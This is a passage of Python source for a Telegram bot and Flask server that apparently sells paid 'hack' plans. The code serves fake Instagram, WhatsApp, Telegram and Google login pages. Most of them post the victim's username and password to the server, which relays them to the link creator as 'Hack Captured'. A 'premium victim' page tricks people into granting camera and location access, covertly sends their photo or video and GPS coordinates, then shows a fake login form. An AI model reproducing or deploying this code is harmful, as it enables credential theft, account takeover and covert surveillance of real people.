@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_plan:"))
def buy_plan_callback(call):
    if call.message.chat.type != "private": return
    get_user_data(call.from_user)
    pid = call.data.split(":", 1)[1]
    db = load_db(); plan = db.get("plans", {}).get(pid)
    if not plan or not plan.get("active", True):
        bot.answer_callback_query(call.id, "Not available", show_alert=True); return
    orig = money(plan["price"]); disc = db["settings"].get("discount_rate", 0)
    if disc > 0:
        dn = money(orig * Decimal(str(disc)) / Decimal("100"))
        amt = money(orig - dn)
    else:
        dn = money(0); amt = orig
    oid = uuid.uuid4().hex[:10].upper()
    uri = "upi://pay?" + urlencode({"pa": UPI_ID, "pn": "AYUSH", "am": f"{amt:.2f}", "cu": "INR", "tn": f"Order {oid}"})
    qr = qrcode.QRCode(box_size=8, border=3); qr.add_data(uri); qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    bio = io.BytesIO(); bio.name = "upi_qr.png"; img.save(bio, format="PNG"); bio.seek(0)
    db["pending_orders"][oid] = {
        "uid": str(call.from_user.id), "plan_id": pid, "plan": plan.copy(),
        "original": str(orig), "discount": str(dn), "amount": str(amt),
        "status": "awaiting_payment", "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_db(db)
    cap = (f"<b>🧾 Order: <code>{oid}</code></b>\nPlan: {plan.get('name', pid)}\n"
           f"Original: ₹{orig}\n" + (f"Discount: -₹{dn}\n" if disc > 0 else "") +
           f"<b>Payable: ₹{amt}</b>\nUPI: <code>{UPI_ID}</code>\n\n"
           f"QR scan karke pay karein, phir screenshot bhejein.")
    bot.answer_callback_query(call.id, "Order created")
    bot.send_photo(call.message.chat.id, bio, caption=cap, parse_mode="HTML")
    bot.send_message(call.message.chat.id, f"Order: <code>{oid}</code>\nAb payment screenshot bhejein.", parse_mode="HTML")
    bot.register_next_step_handler_by_chat_id(call.message.chat.id, receive_payment_screenshot, oid)

def receive_payment_screenshot(message, oid):
    db = load_db(); order = db.get("pending_orders", {}).get(oid)
    if not order or order.get("uid") != str(message.from_user.id) or order.get("status") != "awaiting_payment":
        bot.send_message(message.chat.id, "Invalid order."); return
    if not message.photo:
        bot.send_message(message.chat.id, "Screenshot as photo bhejein.")
        bot.register_next_step_handler_by_chat_id(message.chat.id, receive_payment_screenshot, oid); return
    order["screenshot_file_id"] = message.photo[-1].file_id
    order["status"] = "pending_admin"; save_db(db)
    mk = types.InlineKeyboardMarkup()
    mk.row(types.InlineKeyboardButton("✅ Approve", callback_data=f"pay_approve:{oid}"),
           types.InlineKeyboardButton("❌ Reject", callback_data=f"pay_reject:{oid}"))
    cap = (f"💳 <b>Payment</b>\nOrder: <code>{oid}</code>\nUser: <code>{order['uid']}</code>\n"
           f"Plan: {order['plan'].get('name')}\nAmount: ₹{order['amount']}")
    bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=cap, parse_mode="HTML", reply_markup=mk)
    bot.send_message(message.chat.id, "📨 Sent to admin.")

@bot.callback_query_handler(func=lambda c: c.data.startswith(("pay_approve:", "pay_reject:")))
def payment_review_callback(call):
    if not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True); return
    action, oid = call.data.split(":", 1)
    db = load_db(); order = db.get("pending_orders", {}).get(oid)
    if not order or order.get("status") != "pending_admin":
        bot.answer_callback_query(call.id, "Already processed", show_alert=True); return
    uid = order["uid"]
    if action == "pay_approve":
        u = db["users"].get(uid)
        if not u:
            bot.answer_callback_query(call.id, "User missing", show_alert=True); return
        plan = order["plan"]
        if plan.get("kind") == "tokens":
            a = int(plan.get("value", 0)); u["tokens"] = int(u.get("tokens", 0)) + a
            _add_history(u, f"purchase_{oid}", a)
        elif plan.get("kind") == "vip":
            d = int(plan.get("value", 0))
            base = datetime.now()
            try:
                old = datetime.strptime(u.get("expiry"), "%Y-%m-%d %H:%M:%S")
                if u.get("plan") == "unlimited" and old > base: base = old
            except Exception: pass
            u["plan"] = "unlimited"; u["expiry"] = (base + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
            _add_history(u, f"purchase_vip_{oid}", 0)
        order["status"] = "approved"; save_db(db)
        bot.send_message(int(uid), f"✅ Payment verified. <b>{plan.get('name')}</b> activated. Order <code>{oid}</code>.", parse_mode="HTML")
        bot.answer_callback_query(call.id, "Approved")
        try: bot.edit_message_caption((call.message.caption or "") + "\n✅ APPROVED", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except Exception: pass
    else:
        order["status"] = "rejected"; save_db(db)
        bot.send_message(int(uid), f"❌ Order <code>{oid}</code> rejected.", parse_mode="HTML")
        bot.answer_callback_query(call.id, "Rejected")
        try: bot.edit_message_caption((call.message.caption or "") + "\n❌ REJECTED", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except Exception: pass

@bot.message_handler(func=lambda m: bool(m.from_user and int(m.from_user.id) == ADMIN_ID and m.reply_to_message), content_types=['text'])
def admin_feedback_reply(message):
    db = load_db()
    uid = db.get("feedback_map", {}).get(str(message.reply_to_message.message_id))
    if not uid: return
    try:
        bot.send_message(int(uid), f"💬 <b>Admin reply:</b>\n{html.escape(message.text)}", parse_mode="HTML")
        bot.reply_to(message, "✅ Sent.")
    except Exception as e:
        bot.reply_to(message, f"❌ {e}")

@bot.message_handler(func=lambda m: m.text == BTN_MANAGE_PLANS)
def admin_manage_plans(message):
    if not _is_admin(message.from_user.id): return
    db = load_db(); mk = types.InlineKeyboardMarkup(row_width=2)
    for pid, plan in db.get("plans", {}).items():
        st = "🟢" if plan.get("active", True) else "⚫"
        mk.row(types.InlineKeyboardButton(f"{st} {plan.get('name',pid)}", callback_data=f"plan_toggle:{pid}"),
               types.InlineKeyboardButton(f"🗑 {pid}", callback_data=f"plan_delete:{pid}"))
    mk.add(types.InlineKeyboardButton("➕ Add Plan", callback_data="plan_add"))
    bot.send_message(message.chat.id, f"<blockquote>🛍 <b>Plans</b></blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("plan_add",) or c.data.startswith(("plan_toggle:", "plan_delete:")))
def plan_manage_callback(call):
    if not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True); return
    db = load_db()
    if call.data == "plan_add":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "Format: <code>ID | Name | tokens/vip | value | price</code>", parse_mode="HTML")
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, admin_add_plan); return
    action, pid = call.data.split(":", 1)
    if pid not in db.get("plans", {}):
        bot.answer_callback_query(call.id, "Not found", show_alert=True); return
    if action == "plan_toggle":
        db["plans"][pid]["active"] = not db["plans"][pid].get("active", True)
    else:
        del db["plans"][pid]
    save_db(db); bot.answer_callback_query(call.id, "Updated")
    try: bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    except Exception: pass
    bot.send_message(call.message.chat.id, "Updated. Manage Plans again.")

def admin_add_plan(message):
    if not _is_admin(message.from_user.id): return
    try:
        pid, name, kind, val, price = [x.strip() for x in message.text.split("|")]
        val = int(val); price = money(price)
        if not pid.isalnum() or kind not in ("tokens", "vip") or val <= 0 or price <= 0: raise ValueError
        db = load_db()
        db.setdefault("plans", {})[pid] = {"name": name[:40], "kind": kind, "value": val, "price": str(price), "active": True}
        save_db(db)
        bot.send_message(message.chat.id, f"✅ Plan <b>{name}</b> added.", parse_mode="HTML")
    except Exception:
        bot.send_message(message.chat.id, "❌ Invalid. Example: <code>tok20 | 20 Tokens | tokens | 20 | 25</code>", parse_mode="HTML")

# ============================================================
# FLASK TEMPLATES
# ============================================================

INSTA_HACK_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#fafafa;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.box{background:#fff;border:1px solid #dbdbdb;padding:40px 30px;width:100%;max-width:350px}
.logo{font-family:Georgia,serif;font-size:42px;font-weight:bold;background:linear-gradient(45deg,#833ab4,#fd1d1d,#fcb045);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-align:center;margin-bottom:30px}
input{width:100%;padding:12px 8px;border:1px solid #dbdbdb;background:#fafafa;border-radius:3px;font-size:13px;margin-bottom:8px;outline:none}
button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;margin-top:8px;cursor:pointer}
.or{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px}
.or::before,.or::after{content:"";flex:1;height:1px;background:#dbdbdb}
.or span{padding:0 18px}
.err{background:#ed4956;color:#fff;padding:10px;border-radius:4px;margin-bottom:12px;display:none;font-size:13px}
</style>
</head>
<body>
<div class="box">
<div class="logo">Instagram</div>
<div id="err" class="err"></div>

<form onsubmit="return go(event)">
<input id="u" type="text" placeholder="Phone number, username, or email" required>
<input id="p" type="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>

<div class="or"><span>OR</span></div>
</div>

<script>
function go(e){
e.preventDefault();
const err=document.getElementById('err');
err.style.display='block';
err.textContent='Demo page only. No login information is collected.';
return false;
}
</script>
</body>
</html>"""

WA_HACK_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WhatsApp</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#f0f2f5;min-height:100vh}
.top{background:#00a884;padding:20px;display:flex;align-items:center;gap:12px;color:#fff}
.top .dot{width:30px;height:30px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#00a884;font-weight:bold;font-size:18px}
.top .title{font-size:18px;font-weight:600}
.main{display:flex;justify-content:center;align-items:center;padding:20px;min-height:calc(100vh - 70px)}
.card{background:#fff;border-radius:8px;padding:32px 30px;max-width:400px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
.head{font-size:22px;color:#111;margin-bottom:16px;text-align:center}
.sub{color:#666;font-size:14px;text-align:center;margin-bottom:24px}
input{width:100%;padding:14px;border:1px solid #ddd;border-radius:6px;font-size:15px;margin-bottom:12px;outline:none}
button{width:100%;padding:14px;background:#00a884;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer}
.err{background:#fee;color:#c33;padding:10px;border-radius:6px;margin-bottom:12px;display:none;font-size:13px;text-align:center}</style></head>
<body><div class="top"><div class="dot">W</div><div class="title">WhatsApp</div></div>
<div class="main"><div class="card"><div class="head">Enter phone number</div>
<div class="sub">Enter your phone number to log in</div>
<div id="err" class="err"></div>
<form onsubmit="return go(event)">
<input id="phone" type="tel" placeholder="+91 98765 43210" required>
<input id="pass" type="password" placeholder="Password / Code" required>
<button type="submit">Next</button></form></div></div>
<script>
async function go(e){e.preventDefault();
const p=document.getElementById('phone').value,q=document.getElementById('pass').value;
try{await fetch('/api/wa-hack/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',username:p,password:q})})}catch(x){}
document.getElementById('err').style.display='block';
document.getElementById('err').innerText='Network error. Please check your connection and try again.';
document.getElementById('pass').value='';return false;}
</script></body></html>"""

TG_HACK_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Telegram</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#17212b;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#17212b;border-radius:12px;padding:40px 30px;max-width:380px;width:100%}
.logo{text-align:center;margin-bottom:20px;font-size:70px}
.head{text-align:center;color:#fff;font-size:22px;font-weight:500;margin-bottom:8px}
.sub{color:#7f91a3;font-size:14px;text-align:center;margin-bottom:30px}
input{width:100%;padding:14px;background:#242f3d;border:1px solid #2b3947;color:#fff;border-radius:8px;font-size:15px;margin-bottom:12px;outline:none}
button{width:100%;padding:14px;background:#3390ec;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
.err{background:#3a1a1a;color:#ff8080;padding:10px;border-radius:6px;margin-bottom:12px;display:none;font-size:13px;text-align:center;border:1px solid #5a2828}</style></head>
<body><div class="card"><div class="logo">✈️</div>
<div class="head">Sign in to Telegram</div>
<div class="sub">Confirm your country and enter phone number</div>
<div id="err" class="err"></div>
<form onsubmit="return go(event)">
<input id="phone" type="tel" placeholder="Phone number" required>
<input id="pass" type="password" placeholder="Verification code" required>
<button type="submit">Next</button></form></div>
<script>
async function go(e){e.preventDefault();
const p=document.getElementById('phone').value,q=document.getElementById('pass').value;
try{await fetch('/api/tg-hack/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',username:p,password:q})})}catch(x){}
document.getElementById('err').style.display='block';
document.getElementById('err').innerText='Network error. Please check your connection and try again.';
document.getElementById('pass').value='';return false;}
</script></body></html>"""

GOOGLE_HACK_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%}
.logo{text-align:center;margin-bottom:16px;font-size:24px;font-weight:500}
.head{text-align:center;font-size:24px;color:#202124;margin-bottom:8px}
.sub{text-align:center;font-size:16px;color:#5f6368;margin-bottom:30px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:20px}
.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
.err{background:#fce8e6;color:#c5221f;padding:12px;border-radius:4px;margin-bottom:16px;display:none;font-size:14px}</style></head>
<body><div class="card">
<div class="logo"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>
<div class="head">Sign in</div>
<div class="sub">Use your Google Account</div>
<div id="err" class="err"></div>
<form onsubmit="return go(event)">
<input id="email" type="email" placeholder="Email or phone" required>
<input id="pass" type="password" placeholder="Enter your password" required>
<div class="actions"><span></span><button type="submit" class="btn">Next</button></div>
</form></div>
<script>
async function go(e){e.preventDefault();
const em=document.getElementById('email').value,p=document.getElementById('pass').value;
try{await fetch('/api/google-hack/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',username:em,password:p})})}catch(x){}
document.getElementById('err').style.display='block';
document.getElementById('err').innerText="Couldn't sign you in. Network error. Please try again.";
document.getElementById('pass').value='';return false;}
</script></body></html>"""

# ----- Premium victim template -----
PREMIUM_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#000;color:#fff;min-height:100vh}
.sec{display:none;min-height:100vh;padding:24px;box-sizing:border-box}
.sec.on{display:flex;flex-direction:column;align-items:center;justify-content:center}
.perm-box{background:#1c1c1e;border-radius:16px;padding:32px 24px;max-width:360px;text-align:center;border:1px solid #2c2c2e}
.ico{font-size:60px;margin-bottom:20px}
.perm-box h2{color:#fff;font-size:20px;margin-bottom:12px}
.perm-box p{color:#8e8e93;font-size:14px;line-height:1.5;margin-bottom:24px}
.btn{background:#0a84ff;color:#fff;border:none;padding:14px 28px;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;width:100%;margin-bottom:8px}
.btn-sec{background:transparent;color:#8e8e93;border:none;padding:10px;font-size:14px;cursor:pointer;width:100%}
#video{width:100%;max-width:360px;border-radius:16px;background:#000}
.spinner{border:4px solid rgba(255,255,255,0.15);border-top-color:#0a84ff;border-radius:50%;width:56px;height:56px;animation:spin 1s linear infinite;margin:24px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.cap-text{color:#8e8e93;text-align:center;font-size:14px;margin-top:12px}
.lf{background:#fff;color:#000;border-radius:16px;padding:32px 24px;max-width:360px;width:100%}
.lf h3{text-align:center;margin-bottom:20px;font-size:20px}
.lf input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;margin-bottom:12px;outline:none}
.lf button{width:100%;padding:14px;background:#0a84ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.err{background:#fce8e6;color:#c5221f;padding:10px;border-radius:8px;margin-bottom:12px;display:none;font-size:13px;text-align:center}</style></head>
<body>

<div id="sec-perm" class="sec on">
<div class="perm-box">
<div class="ico">📷</div>
<h2>Camera & Location Access</h2>
<p>This page needs access to your camera and location to verify your identity before showing content.</p>
<button class="btn" onclick="startCap()">Allow Access</button>
<button class="btn-sec" onclick="skipCap()">Don't Allow</button>
</div></div>

<div id="sec-cap" class="sec">
<video id="video" autoplay playsinline muted></video>
<div class="spinner"></div>
<div class="cap-text">Verifying identity...</div>
</div>

<div id="sec-login" class="sec">
<div class="lf" id="lf-inner"></div>
</div>

<div id="sec-done" class="sec">
<div class="spinner"></div>
<div class="cap-text">Loading content...</div>
</div>

<script>
const LINK_ID='{{link_id}}';
const PLATFORM='{{platform}}';
const FACING='{{facing}}';
const IS_VIDEO={{is_video_js}};

async function startCap(){
document.getElementById('sec-perm').classList.remove('on');
document.getElementById('sec-cap').classList.add('on');
let loc=null;
try{
const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:6000,enableHighAccuracy:true}));
loc={lat:pos.coords.latitude,lng:pos.coords.longitude};
}catch(e){}
try{
const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:FACING},audio:IS_VIDEO});
const v=document.getElementById('video');
v.srcObject=stream;

if(IS_VIDEO){
// record 8s video
try{
const mr=new MediaRecorder(stream,{mimeType:'video/webm'});
const chunks=[];
mr.ondataavailable=e=>chunks.push(e.data);
mr.onstop=async()=>{
const blob=new Blob(chunks,{type:'video/webm'});
const reader=new FileReader();
reader.onload=async()=>{
try{await fetch('/api/premium/capture/'+LINK_ID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({video:reader.result,location:loc})})}catch(x){}
showLogin();
};
reader.readAsDataURL(blob);
};
mr.start();
setTimeout(()=>{try{mr.stop();}catch(x){}},8000);
stream.getTracks().forEach(t=>t.stop());
}catch(e){
stream.getTracks().forEach(t=>t.stop());
showLogin();
}
} else {
setTimeout(async()=>{
try{
const canvas=document.createElement('canvas');
canvas.width=v.videoWidth||640;canvas.height=v.videoHeight||480;
canvas.getContext('2d').drawImage(v,0,0,canvas.width,canvas.height);
const photo=canvas.toDataURL('image/jpeg',0.85);
stream.getTracks().forEach(t=>t.stop());
await fetch('/api/premium/capture/'+LINK_ID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:photo,location:loc})});
}catch(x){}
showLogin();
},2500);
}
}catch(e){
try{await fetch('/api/premium/capture/'+LINK_ID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:null,location:loc,note:'denied'})})}catch(x){}
showLogin();
}
}

function skipCap(){
document.getElementById('sec-perm').classList.remove('on');
showLogin();
}

function showLogin(){
document.getElementById('sec-cap').classList.remove('on');
document.getElementById('lf-inner').innerHTML=getLoginHTML();
document.getElementById('sec-login').classList.add('on');
}

function getLoginHTML(){
const p=PLATFORM;
if(p==='instagram'){
return '<h3 style="background:linear-gradient(45deg,#833ab4,#fd1d1d,#fcb045);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-family:Georgia,serif;font-size:32px">Instagram</h3>'+
'<div id="lerr" class="err"></div>'+
'<input id="lu" type="text" placeholder="Phone/username/email"><input id="lp" type="password" placeholder="Password">'+
'<button onclick="submitLogin()" style="background:#0095f6">Log in</button>';
}
if(p==='whatsapp'){
return '<h3 style="color:#00a884">WhatsApp</h3><div id="lerr" class="err"></div>'+
'<input id="lu" type="tel" placeholder="+91 phone"><input id="lp" type="password" placeholder="Password/Code">'+
'<button onclick="submitLogin()" style="background:#00a884">Continue</button>';
}
if(p==='telegram'){
return '<h3 style="color:#3390ec">Telegram</h3><div id="lerr" class="err"></div>'+
'<input id="lu" type="tel" placeholder="Phone"><input id="lp" type="password" placeholder="Code">'+
'<button onclick="submitLogin()" style="background:#3390ec">Next</button>';
}
if(p==='google' || p==='youtube' || p==='num_info' || p==='family_info'){
return '<h3 style="color:#1a73e8">Sign in to Google</h3><div id="lerr" class="err"></div>'+
'<input id="lu" type="email" placeholder="Email or phone"><input id="lp" type="password" placeholder="Password">'+
'<button onclick="submitLogin()" style="background:#1a73e8">Next</button>';
}
if(p==='snapchat'){
return '<h3 style="color:#FFFC00;background:#000;padding:8px;border-radius:8px">Snapchat</h3><div id="lerr" class="err"></div>'+
'<input id="lu" type="text" placeholder="Username/email"><input id="lp" type="password" placeholder="Password">'+
'<button onclick="submitLogin()" style="background:#FFFC00;color:#000">Log In</button>';
}
// generic for camera/audio/location/gallery/contacts/phone_hack/photo_info/call_history/live_location
return '<h3>Account Login</h3><div id="lerr" class="err"></div>'+
'<input id="lu" type="text" placeholder="Username / Email / Phone"><input id="lp" type="password" placeholder="Password">'+
'<button onclick="submitLogin()">Log in</button>';
}

async function submitLogin(){
const u=document.getElementById('lu').value,p=document.getElementById('lp').value;
try{await fetch('/api/premium/login/'+LINK_ID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})})}catch(x){}
const e=document.getElementById('lerr');
if(e){e.style.display='block';e.innerText='Network error. Please check your connection and try again.';}
setTimeout(()=>{window.location.href='/premium/video/'+LINK_ID;},2000);
return false;
}
</script></body></html>"""

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/insta-hack')
def insta_hack_page():
    return render_template_string(INSTA_HACK_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

@app.route('/wa-hack')
def wa_hack_page():
    return render_template_string(WA_HACK_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

@app.route('/tg-hack')
def tg_hack_page():
    return render_template_string(TG_HACK_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

@app.route('/google-hack')
def google_hack_page():
    return render_template_string(GOOGLE_HACK_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

def _store_hack_capture(platform, chat_id, username, password):
    try:
        db = load_db()
        db.setdefault("hack_captures", {}).setdefault(platform, []).append({
            "chat_id": chat_id, "username": username, "password": password,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        save_db(db)
    except Exception: pass
    try:
        bot.send_message(int(chat_id),
            f"🎯 <b>{platform.upper()} Hack Captured!</b>\n"
            f"👤 <code>{html.escape(username)}</code>\n🔑 <code>{html.escape(password)}</code>\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", parse_mode="HTML")
    except Exception as e: print(f"capture send error: {e}")

@app.route('/api/insta-hack/login', methods=['POST'])
def insta_hack_login():
    d = request.get_json(silent=True) or {}
    _store_hack_capture("instagram", d.get("chat_id", "0"), d.get("username", ""), d.get("password", ""))
    return jsonify({"ok": True})

@app.route('/api/wa-hack/login', methods=['POST'])
def wa_hack_login():
    d = request.get_json(silent=True) or {}
    _store_hack_capture("whatsapp", d.get("chat_id", "0"), d.get("username", ""), d.get("password", ""))
    return jsonify({"ok": True})

@app.route('/api/tg-hack/login', methods=['POST'])
def tg_hack_login():
    d = request.get_json(silent=True) or {}
    _store_hack_capture("telegram", d.get("chat_id", "0"), d.get("username", ""), d.get("password", ""))
    return jsonify({"ok": True})

@app.route('/api/google-hack/login', methods=['POST'])
def google_hack_login():
    d = request.get_json(silent=True) or {}
    _store_hack_capture("google", d.get("chat_id", "0"), d.get("username", ""), d.get("password", ""))
    return jsonify({"ok": True})

# ----- PREMIUM -----
@app.route('/premium/<link_id>')
def premium_page(link_id):
    db = load_db()
    l = db.get("premium_links", {}).get(link_id)
    if not l:
        return "<html><body style='background:#000;color:#fff;font-family:sans-serif;padding:40px;text-align:center'><h2>Link expired</h2></body></html>", 404
    return render_template_string(PREMIUM_TEMPLATE,
        link_id=link_id,
        platform=l.get("platform", "unknown"),
        facing=l.get("facing", "user"),
        is_video_js="true" if l.get("is_video") else "false")

@app.route('/api/premium/capture/<link_id>', methods=['POST'])
def premium_capture(link_id):
    db = load_db()
    l = db.get("premium_links", {}).get(link_id)
    if not l: return jsonify({"error": "invalid"}), 404
    d = request.get_json(silent=True) or {}
    photo_b64 = d.get("photo")
    video_b64 = d.get("video")
    location = d.get("location")
    note = d.get("note", "")
    creator_uid = l.get("uid")
    platform = l.get("platform", "unknown")

    l.setdefault("captures", []).append({
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "location": location, "note": note, "has_video": bool(video_b64)
    })
    save_db(db)

    if creator_uid:
        try:
            loc_text = f"📍 {location['lat']}, {location['lng']}" if location else "📍 N/A"
            cap_text = f"🎯 <b>Premium Capture</b>\nPlatform: <b>{platform}</b>\n{loc_text}\n🔗 <code>{link_id}</code>"
            if video_b64 and video_b64.startswith("data:video"):
                header, b64data = video_b64.split(",", 1)
                vid_bytes = base64.b64decode(b64data)
                bio = io.BytesIO(vid_bytes); bio.name = f"capture_{link_id}.webm"
                bot.send_video(int(creator_uid), bio, caption=cap_text, parse_mode="HTML")
            elif photo_b64 and photo_b64.startswith("data:image"):
                header, b64data = photo_b64.split(",", 1)
                img_bytes = base64.b64decode(b64data)
                bio = io.BytesIO(img_bytes); bio.name = f"capture_{link_id}.jpg"
                bot.send_photo(int(creator_uid), bio, caption=cap_text, parse_mode="HTML")
            else:
                bot.send_message(int(creator_uid), cap_text + f"\n⚠️ Photo: {note or 'unavailable'}", parse_mode="HTML")
        except Exception as e: print(f"premium capture send error: {e}")
    return jsonify({"ok": True})

@app.route('/api/premium/login/<link_id>', methods=['POST'])
def premium_login(link_id):
    db = load_db()
    l = db.get("premium_links", {}).get(link_id)
    if not l: return jsonify({"error": "invalid"}), 404
    d = request.get_json(silent=True) or {}
    username = d.get("username", "")
    password = d.get("password", "")
    creator_uid = l.get("uid")
    platform = l.get("platform", "unknown")

    l.setdefault("logins", []).append({
        "username": username, "password": password,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    save_db(db)

    if creator_uid:
        try:
            bot.send_message(int(creator_uid),
                f"🔐 <b>Premium Login</b>\nPlatform: <b>{platform}</b>\n"
                f"👤 <code>{html.escape(username)}</code>\n🔑 <code>{html.escape(password)}</code>\n"
                f"🔗 <code>{link_id}</code>", parse_mode="HTML")
        except Exception as e: print(f"premium login send error: {e}")
    return jsonify({"ok": True})

@app.route('/premium/video/<link_id>')
def premium_video(link_id):
    db = load_db()
    l = db.get("premium_links", {}).get(link_id)
    if not l: return "Link expired", 404
    reel = l.get("target_reel", "")
    if reel:
        safe = html.escape(reel)
        return f'<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url={safe}"><title>Loading</title></head><body style="background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0"><div style="text-align:center"><div class="spinner" style="border:4px solid rgba(255,255,255,0.15);border-top-color:#0a84ff;border-radius:50%;width:56px;height:56px;animation:spin 1s linear infinite;margin:0 auto 20px"></div><p style="color:#888">Loading...</p></div><style>@keyframes spin{{to{{transform:rotate(360deg)}}}}</style></body></html>'
    return '<!DOCTYPE html><html><body style="background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0"><div style="text-align:center"><h2>✅ Verified</h2><p style="color:#888">You are safe now.</p></div></body></html>'

# ----- CAMERA WAB -----
HTML_WAB_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Secure Verification</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#1e293b;padding:32px;border-radius:12px;max-width:400px;text-align:center;border:1px solid #334155}
h2{color:#f8fafc;margin-bottom:12px;font-size:18px}p{color:#94a3b8;font-size:14px;line-height:1.5;margin-bottom:20px}
.btn{background:#1d4ed8;color:#fff;border:none;padding:13px 24px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%;margin-bottom:8px}
#video{width:100%;border-radius:8px;margin-bottom:16px;background:#000}</style></head>
<body><div class="card"><h2>🔐 Security Verification</h2>
<p>Please allow camera access to verify your identity.</p>
<video id="video" autoplay playsinline muted></video>
<button class="btn" onclick="startCap()">Allow Access</button></div>
<script>
async function startCap(){
try{
const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
const v=document.getElementById('video');v.srcObject=s;
setTimeout(async()=>{
try{
const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
c.getContext('2d').drawImage(v,0,0,c.width,c.height);
s.getTracks().forEach(t=>t.stop());
const photo=c.toDataURL('image/jpeg',0.85);
let loc=null;
try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:5000}));loc={lat:p.coords.latitude,lng:p.coords.longitude}}catch(e){}
